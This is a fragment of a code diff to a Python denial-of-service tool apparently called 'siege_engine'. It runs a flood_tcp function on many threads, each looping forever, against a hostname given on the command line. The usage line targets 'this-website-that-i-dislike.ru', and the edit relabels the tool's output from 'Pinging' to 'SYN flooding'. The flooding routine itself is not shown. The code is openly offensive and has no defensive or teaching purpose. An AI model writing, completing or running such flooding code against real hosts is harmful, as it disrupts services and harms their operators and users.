@@ -21,7 +21,7 @@ def flood_tcp(host: str):
 class DoYourThing(threading.Thread):
     def __init__(self, hostname: str):
         self.hostname = hostname
-        super().__init__()
+        super().__init__(daemon=True)
 
     def run(self):
         while True:
@@ -34,7 +34,7 @@ def run():
         print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
         sys.exit(1)
     amount, hostname = sys.argv[1:]
-    print('Pinging %s on %s threads' % (hostname, amount))
+    print('SYN flooding %s on %s threads' % (hostname, amount))
     amount = int(amount)
     now = (time.time())
     for _ in range(amount):
